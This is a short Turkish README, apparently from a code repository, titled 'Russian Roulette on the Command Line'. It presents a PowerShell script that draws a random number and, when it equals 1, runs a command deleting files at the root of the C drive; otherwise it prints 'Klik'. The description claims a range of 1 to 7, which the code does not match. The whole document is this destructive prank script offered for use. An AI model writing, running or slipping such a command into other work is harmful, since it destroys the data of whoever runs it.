# Komut Satırında Rus Ruleti

## Açıklama 
**1 ile 7 arasında rastgele bir sayı üreten ve üretilen sayının 1 olması durumunda C diskindeki verileri silen bir script**

#### Kodlar

```
$n=Get-Random -Maximum 7 -Minimum 1

If ($n -eq 1) {
     del C:\*
  }  Else {
  'Klik'
} 

```











